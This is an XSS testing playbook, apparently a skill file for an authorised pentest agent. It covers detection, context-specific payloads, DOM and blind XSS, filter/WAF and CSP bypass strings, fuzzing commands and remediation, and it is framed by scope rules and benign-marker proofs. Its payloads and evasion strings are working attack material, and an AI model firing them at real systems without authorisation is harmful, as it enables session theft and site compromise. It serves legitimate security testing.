---
name: web-xss
description: "Cross-site scripting testing for a pentest-team engagement — reflected/stored/DOM and mutation XSS, blind XSS via an in-scope callback listener, context-aware payloads (HTML/attribute/JS/URL/CSS), DOM sink analysis, CSP bypass, and filter/WAF evasion, with Dalfox/XSStrike/Arjun/DOM-Invader tooling. Load it when the appsec-triage input-validation sweep turns up an XSS lead on a claimed web/API target."
---

# Cross-Site Scripting — under the engagement protocol

Deep methodology for the XSS class. You reach here from the `appsec-triage` input-validation sweep with a lead on a surface you already own on the board.

## Under the engagement protocol

- **Claimed and in-scope only.** Every reflection probe, stored payload, and callback fires against a target you own on the board and that is on the `ROE.md` allowlist — nothing else.
- **Prove with a benign marker, not a live steal.** Confirm execution with a side-effect that harms nobody — a unique `console.log('<marker>')`, a DOM write you observe in DevTools, or a beacon to your **in-scope** listener. Never wire the payload to exfiltrate a real victim's cookie/session to an external host; a proof that JS runs is the finding, an actual credential theft is not.
- **Execution alone is not the finding — prove the sink and the impact.** A fired marker is necessary, not sufficient. Before you file, the finding must carry all four: (1) **the exact sink** — name the output context (HTML body / attribute / JS string / URL / CSS) and the DOM or server sink that rendered the payload, so the fix is unambiguous; (2) **a negative control** — the same payload neutralized in a correctly-encoded context (or on an adjacent input that escapes), proving it is *this* sink, not an artifact of your test harness; (3) **a benign impact demonstration appropriate to context** — not just `console.log`, but a side-effect that shows what an attacker gains: read a value the page would guard (a CSRF token, `document.cookie` *keys* — not a live session value), issue a same-origin state-reading request as the current session and show the response in the marker, or (for a privileged/admin sink) prove the privileged context with the in-scope listener hit. Stop at the proof — never perform the state-changing or data-stealing action for real; (4) **audience and reach** — who renders the payload (self / other test users / real users / admin), persistence (reflected vs stored), and any auth/preconditions, because that is the severity. A finding that shows only "JS ran" with no sink, no negative control, and no impact framing goes back as a candidate, not a confirmed finding.
- **Read before write; escalation is gated.** Reflected probing is read-mostly, but a stored payload persists and can fire in another user's browser (an admin, a real customer). Plant a payload only where it lands in **your own** test record or a planted marker record; anything that would execute for a real user, register a service worker, or push to production is outward-facing — mark the surface blocked and route through the lead to the anchor for the human's explicit go.
- **OOB/blind goes to a benign in-scope listener only.** Blind XSS callbacks (`XSS Hunter`-style) point at a listener **inside the allowlist** — never a live external collector pulling real admin cookies. Reaching the listener proves the sink; that is the whole proof.
- **Rate-limit and coordinate.** Dalfox/XSStrike fuzzing hammers a shared target and trips a WAF ban for the whole team. Throttle, and coordinate load on the board — don't fuzz an endpoint another operator is mid-testing.
- **Log and file** per PROTOCOL §Evidence and §Findings — findings in the `appsec-reporting` format, with a reproduction another operator could re-run against an in-scope target.

## Quick workflow

1. Map every input vector reaching a rendered response (URL params/fragments/path, form fields incl. hidden, cookies, headers like `Referer`/`User-Agent`, JSON/XML bodies, WebSocket frames, filenames).
2. Fire a benign probe per vector; note reflection point and what got filtered/encoded.
3. Identify the **output context** (HTML body / attribute / JS string / URL / CSS) and craft the context-specific payload.
4. Confirm execution with a marker side-effect; if a control blocks it, work the filter/CSP/WAF bypass.
5. For blind sinks (admin panels, log viewers), plant a callback to your in-scope listener and wait.
6. Before filing, meet the verification bar (above): exact sink + output context, a negative control, a benign impact demonstration for that context, and the audience/persistence that sets severity. Then file with a clean reproduction and remediation.

## Detection

### Benign probe (safe first shot)
Use a unique marker so you can grep responses and the ledger later:
```
xss<marker>7                 -- reflects unescaped? look for it raw in the response body
"'><xss<marker>>            -- does it break out of a tag/attribute?
```
Prefer an observable non-alert side-effect — modern browsers suppress `alert`/`confirm`/`prompt` in cross-origin iframes and background tabs:
```html
<img src=x onerror=console.log('<marker>')>
```

### Context-aware payloads
Identify where input lands, then match the payload to the context:
```
# HTML body
<script>console.log('<marker>')</script>
<svg onload=console.log('<marker>')>

# HTML attribute (break out first)
" autofocus onfocus=console.log('<marker>') x="
' autofocus onfocus=console.log('<marker>') x='

# JavaScript string
';console.log('<marker>');//
\';console.log('<marker>');//
${console.log('<marker>')}          -- template literal

# URL context (href/src)
javascript:console.log('<marker>')

# CSS context
</style><svg onload=console.log('<marker>')>
```

### DOM-based (client-side, never hits the server)
Trace **source → sink** in the app's JS. Sources: `location.hash`, `location.search`, `document.URL`, `document.referrer`, `postMessage`. Sinks: `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `document.write`, `eval`, `setTimeout`/`setInterval`, `Function`, jQuery `$()`/`.html()`. The fragment is the classic vector because it never leaves the browser:
```
https://<in-scope>/#<img src=x onerror=console.log('<marker>')>
```
Use Burp **DOM Invader** or DevTools breakpoints on the sink to confirm the taint path. Also test **prototype pollution → DOM XSS** where deep-merge/`Object.assign` runs on user JSON:
```
?__proto__[innerHTML]=<img src=x onerror=console.log('<marker>')>
```

### Stored (persistent)
Inject where input is saved and rendered later (comments, profile, reviews). Plant it in **your own** test record or a planted marker record — never where it would fire for a real user without the anchor's go. Then load the render path and watch for the marker. Note who the audience is (self / other test users / real users / admin) — that drives severity.

### Blind XSS (in-scope callback only)
For sinks you can't see (admin dashboards, log viewers, support tools), plant a payload that beacons to your **in-scope** listener:
```html
"><script src=https://<in-scope-listener>/x.js></script>
```
A hit on the listener proves the sink executed in a privileged context — that callback is the proof; do not have `x.js` harvest a real admin's cookies.

### Mutation XSS (mXSS)
Valid-looking HTML that mutates when the browser re-parses it, slipping past a sanitizer/WAF — content that re-serializes inside `<svg>`/`<math>`/`<template>` into an executing tag. Confirm with the marker side-effect, note the exact sanitizer version.

## Automation (throttled, in-scope)

```bash
# Parameter discovery first
gau <in-scope> | grep '=' | tee urls
arjun -u "https://<in-scope>/search" -oJ params.json

# Reflected-XSS fuzzing — keep it slow on shared/prod targets
dalfox url "https://<in-scope>/search?q=FUZZ" --delay 1000 --worker 1
# Blind mode points ONLY at your in-scope listener:
dalfox url "https://<in-scope>/contact" -b https://<in-scope-listener>

# DOM-focused detection
xsstrike -u "https://<in-scope>/page?q=1" --crawl
```
Keep workers low and add a delay; never point automation at a host outside the allowlist, and back off the moment the target slows.

## Filter and CSP/WAF bypass (when a control sits in front)

### Filter / tag / string evasion
```
<scr<script>ipt>console.log(1)</scr</script>ipt>     -- nested-tag strip bypass
<svg><animate onbegin=console.log(1) attributeName=x>
<img src=x onerror=console.log`1`>                   -- backticks beat paren filters
top['al'+'ert']  eval(atob('...'))                   -- string reassembly
<img src=x onerror="&#x63;onsole.log(1)">            -- HTML-entity encoding
```
Rotate event handlers (`onload onfocus onmouseover ontoggle onbegin`) and vary tag/whitespace/encoding to break signatures. If a WAF is present, note **which payload bypassed it** — the control's efficacy is itself reportable.

### CSP bypass
Read the policy first (`Content-Security-Policy` header). Look for `unsafe-inline`/`unsafe-eval` in `script-src` (inline runs directly); an allow-listed host serving a **JSONP** endpoint (`<script src="https://allowed/jsonp?callback=console.log">`); missing `object-src`/`base-uri` (`<base>`/object legacy vectors); a reflected/injectable nonce under `strict-dynamic`, or a Trusted Types policy piping `location.hash` into `createHTML`. Report the exact directive gap alongside the payload.

## Remediation (for the finding)

1. **Fix** — context-aware output encoding at every sink (HTML-entity for body, attribute encoding for attributes, JS-string escaping for scripts). For rich HTML, sanitize with the native **Sanitizer API** (`element.setHTML(input, {sanitizer})`) or DOMPurify — never `innerHTML`/`v-html`/`dangerouslySetInnerHTML`/`{@html}` on untrusted data. Fix DOM XSS by writing to `textContent`, not HTML sinks.
2. **Defense in depth** — a strict CSP (`script-src 'nonce-<rand>' 'strict-dynamic'; object-src 'none'; base-uri 'none'; require-trusted-types-for 'script'`); `HttpOnly; Secure; SameSite=Strict` cookies and server-side sessions so a fired payload can't lift the session token; framework-native escaping left on.
3. **Detection** — a WAF/SIEM rule on the injection signature and, for stored XSS, an alert on markup landing in a field that should be plain text.

Write it up in the `appsec-reporting` finding format, CWE-79 / A03:2021 Injection, with the marker-based reproduction, the exact context/sink that fired, the negative control, the benign impact demonstration, and the audience/persistence that justifies the severity.
